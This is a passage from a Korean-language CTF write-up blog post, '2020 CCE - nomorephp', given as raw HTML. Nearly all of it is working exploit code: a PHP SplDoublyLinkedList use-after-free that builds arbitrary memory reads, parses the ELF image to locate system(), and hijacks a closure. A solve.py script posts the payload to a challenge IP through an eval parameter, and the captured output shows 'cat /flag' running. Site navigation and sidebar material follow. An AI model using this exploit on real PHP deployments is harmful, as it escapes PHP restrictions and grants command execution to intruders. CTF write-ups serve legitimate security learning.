class="line">        <span class="keyword">global</span> $dlls;</span><br><span class="line">        <span class="comment">#D print('__destruct: ' . $this-&gt;i . "\n");</span></span><br><span class="line">        $dlls[<span class="keyword">$this</span>-&gt;i]-&gt;offsetUnset(<span class="number">0</span>);</span><br><span class="line">        $dlls[<span class="keyword">$this</span>-&gt;i+<span class="number">1</span>]-&gt;push(<span class="number">123</span>);</span><br><span class="line">        $dlls[<span class="keyword">$this</span>-&gt;i+<span class="number">1</span>]-&gt;offsetUnset(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SystemExecutor</span> <span class="keyword">extends</span> <span class="title">ArrayObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::offsetGet($x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reads an arbitrary address by changing a zval to point to the address minus 0x10,</span></span><br><span class="line"><span class="comment"> * and setting its type to zend_string, so that zend_string-&gt;len points to the value</span></span><br><span class="line"><span class="comment"> * we want to read.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($addr, $s=<span class="number">8</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $fake_dll_element, $leaked_str_offsets, $rw_dll;</span><br><span class="line"></span><br><span class="line">    i2s($fake_dll_element, $leaked_str_offsets[<span class="number">2</span>] + <span class="number">0x18</span>, $addr - <span class="number">0x10</span>);</span><br><span class="line">    i2s($fake_dll_element, $leaked_str_offsets[<span class="number">2</span>] + <span class="number">0x20</span>, <span class="number">0x00000006</span>);</span><br><span class="line"></span><br><span class="line">    $value = strlen($rw_dll[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($s != <span class="number">8</span>)</span><br><span class="line">        $value &amp;= (<span class="number">1</span> &lt;&lt; ($s &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $base = <span class="number">0</span>;</span><br><span class="line">    $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">        $leak = read($addr, <span class="number">7</span>);</span><br><span class="line">        <span class="comment"># ELF header</span></span><br><span class="line">        <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>)</span><br><span class="line">            <span class="keyword">return</span> $addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># We'll crash before this but it's clearer this way</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Exploit failed: Unable to find ELF header'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $e_type = read($base + <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    $e_phoff = read($base + <span class="number">0x20</span>);</span><br><span class="line">    $e_phentsize = read($base + <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">    $e_phnum = read($base + <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">        $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">        $p_type  = read($header + <span class="number">0x00</span>, <span class="number">4</span>);</span><br><span class="line">        $p_flags = read($header + <span class="number">0x04</span>, <span class="number">4</span>);</span><br><span class="line">        $p_vaddr = read($header + <span class="number">0x10</span>);</span><br><span class="line">        $p_memsz = read($header + <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">            <span class="comment"># handle pie</span></span><br><span class="line">            $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">            $data_size = $p_memsz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">            $text_size = $p_memsz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Exploit failed: Unable to parse ELF'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">        $leak = read($data_addr + $i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak &lt; $data_addr) &#123;</span><br><span class="line">            $deref = read($leak);</span><br><span class="line">            <span class="comment"># 'constant' constant check</span></span><br><span class="line">            <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        $leak = read($data_addr + ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak &lt; $data_addr) &#123;</span><br><span class="line">            $deref = read($leak);</span><br><span class="line">            <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">            <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $addr = $basic_funcs;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $f_entry = read($addr);</span><br><span class="line">        $f_name = read($f_entry, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">            <span class="keyword">return</span> read($addr + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $addr += <span class="number">0x20</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system_address</span><span class="params">($binary_leak)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $base = get_binary_base($binary_leak);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'ELF base: 0x'</span> .dechex($base) . <span class="string">"\n"</span>);</span><br><span class="line">    $elf = parse_elf($base);</span><br><span class="line">    $basic_funcs = get_basic_funcs($base, $elf);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'Basic functions: 0x'</span> .dechex($basic_funcs) . <span class="string">"\n"</span>);</span><br><span class="line">    $zif_system = get_system($basic_funcs);</span><br><span class="line">    <span class="keyword">return</span> $zif_system;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dlls = [];</span><br><span class="line">$strs = [];</span><br><span class="line">$rw_dll = <span class="keyword">new</span> SplDoublyLinkedList();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a chain of dangling triggers, which will all in turn</span></span><br><span class="line"><span class="comment"># free current-&gt;next, push an element to the next list, and free current</span></span><br><span class="line"><span class="comment"># This will make sure that every current-&gt;next points the same memory block,</span></span><br><span class="line"><span class="comment"># which we will UAF.</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; NB_DANGLING; $i++)</span><br><span class="line">&#123;</span><br><span class="line">    $dlls[$i] = <span class="keyword">new</span> SplDoublyLinkedList();</span><br><span class="line">    $dlls[$i]-&gt;push(<span class="keyword">new</span> DanglingTrigger($i));</span><br><span class="line">    $dlls[$i]-&gt;rewind();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># We want our UAF'd list element to be before two strings, so that we can</span></span><br><span class="line"><span class="comment"># obtain the address of the first string, and increase is size. We then have</span></span><br><span class="line"><span class="comment"># R/W over all memory after the obtained address.</span></span><br><span class="line">define(<span class="string">'NB_STRS'</span>, <span class="number">50</span>);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; NB_STRS; $i++)</span><br><span class="line">&#123;</span><br><span class="line">    $strs[] = str_shuffle(str_repeat(<span class="string">'A'</span>, SIZE_ELEM_STR));</span><br><span class="line">    i2s($strs[$i], <span class="number">0</span>, STR_MARKER);</span><br><span class="line">    i2s($strs[$i], <span class="number">8</span>, $i, <span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Free one string in the middle, ...</span></span><br><span class="line">$strs[NB_STRS - <span class="number">20</span>] = <span class="number">123</span>;</span><br><span class="line"><span class="comment"># ... and put the to-be-UAF'd list element instead.</span></span><br><span class="line">$dlls[<span class="number">0</span>]-&gt;push(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup the last DLlist, which will exploit the UAF</span></span><br><span class="line">$dlls[NB_DANGLING] = <span class="keyword">new</span> SplDoublyLinkedList();</span><br><span class="line">$dlls[NB_DANGLING]-&gt;push(<span class="keyword">new</span> UAFTrigger());</span><br><span class="line">$dlls[NB_DANGLING]-&gt;rewind();</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the bug on the first list</span></span><br><span class="line">$dlls[<span class="number">0</span>]-&gt;offsetUnset(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'payload'</span>: open(<span class="string">'uaf.php'</span>).read().replace(<span class="string">'&lt;?php'</span>, <span class="string">''</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">"http://54.180.143.146/?code=eval($_POST['payload']);"</span>, data=data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+<p>실행 결과</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kimtruth ❯ python solve.py</span><br><span class="line">Address of first RW chunk: 0x7f62a92caa00</span><br><span class="line">Leaked zval_ptr_dtor address: 0x7f62aa1557c0</span><br><span class="line">ELF base: 0x7f62a9d48000</span><br><span class="line">Basic functions: 0x7f62aaa5b920</span><br><span class="line">Got PHP_FUNCTION(system): 0x7f62aa071100</span><br><span class="line">Replaced zend_closure by the fake one: 0x7f62a92b7298</span><br><span class="line">Running system(&quot;cat /flag&quot;);</span><br><span class="line">cce2020&#123;4fa3e037f19d5be412006921e569d581b063f6df64adab8254bddfb37ec39fa61387cabc70a71e3acecf41257cd4f7550e22bb26013cf51b&#125;</span><br><span class="line">DONE</span><br></pre></td></tr></table></figure>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="https://kimtruth.github.io/2020/09/27/2020-CCE-nomorephp/" data-id="ckor8g4l50006hqwyk0lnhxvy" class="article-share-link"><i class="fa fa-share"></i>Compartir</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>seguir:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="facebook" href="https://www.facebook.com/k1mtruth" target="_blank">
+                        <i class="icon fa fa-facebook"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/kimtruth/" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2020/09/27/2020-CCE-Wordpresso/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">més nou</strong>
+        <p class="article-nav-title">
+        
+            2020 CCE - Wordpresso
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2020/09/13/2020-Cyberoc-Vaccine-Paper/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">antic</strong>
+        <p class="article-nav-title">2020 Cyberoc - Vaccine Paper (Web)</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2021/05/16/Frag-Attacks/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2021/05/16/Frag-Attacks/title.png)" alt="Frag Attacks" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Network/">Network</a></p>
+                            <p class="item-title"><a href="/2021/05/16/Frag-Attacks/" class="title">Frag Attacks</a></p>
+                            <p class="item-date"><time datetime="2021-05-16T10:12:38.000Z" itemprop="datePublished">2021-05-16</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-cms-again/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-cms-again/0.png)" alt="2020 CCE - cms again" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-cms-again/" class="title">2020 CCE - cms again</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-Wordpresso/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-Wordpresso/0.png)" alt="2020 CCE - Wordpresso" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-Wordpresso/" class="title">2020 CCE - Wordpresso</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-nomorephp/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-nomorephp/0.png)" alt="2020 CCE - nomorephp" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-nomorephp/" class="title">2020 CCE - nomorephp</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/13/2020-Cyberoc-Vaccine-Paper/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/13/2020-Cyberoc-Vaccine-Paper/10.png)" alt="2020 Cyberoc - Vaccine Paper (Web)" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/13/2020-Cyberoc-Vaccine-Paper/" class="title">2020 Cyberoc - Vaccine Paper (Web)</a></p>
+                            <p class="item-date"><time datetime="2020-09-12T15:00:00.000Z" itemprop="datePublished">2020-09-13</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Development/">Development</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Development/Algorithm/">Algorithm</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Development/iOS/">iOS</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/">Hacking</a><span class="category-list-count">60</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Crpto/">Crpto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Crypto/">Crypto</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Forensic/">Forensic</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Misc/">Misc</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Network/">Network</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Pwnable/">Pwnable</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Reversing/">Reversing</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Web/">Web</a><span class="category-list-count">15</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Question/">Question</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Story/">Story</a><span class="category-list-count">3</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">arxius</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">etiquetes</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0ctf-2017/">0ctf 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-CCE/">2020 CCE</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-Cyberoc/">2020 Cyberoc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Code-Blue-CTF-2018-Quals/">Code Blue CTF 2018 Quals</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2018-Final/">Codegate CTF 2018 Final</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2018-Preliminary/">Codegate CTF 2018 Preliminary</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2020-Preliminary/">Codegate CTF 2020 Preliminary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEF-CON-CTF-Qualifier-2017/">DEF CON CTF Qualifier 2017</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEFCON-2018/">DEFCON 2018</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FBCTF-2019/">FBCTF 2019</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HDCON-2017/">HDCON 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HITCON-CTF-2017/">HITCON CTF 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Harekaze-CTF/">Harekaze CTF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Maplestory/">Maplestory</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Math/">Math</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PCTF-2018/">PCTF 2018</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Project/">Project</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA-1/">SHA-1</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA2017-CTF/">SHA2017 CTF</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-PreQuals-2017/">Samsung CTF PreQuals 2017</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-PreQuals-2018/">Samsung CTF PreQuals 2018</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-Quals-2018/">Samsung CTF Quals 2018</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TAMU-CTF/">TAMU CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Whitehat-Contest-2018-PreQual/">Whitehat Contest 2018 PreQual</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Whitehat-contest-2017-PreQual/">Whitehat contest 2017 PreQual</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WiFi/">WiFi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" 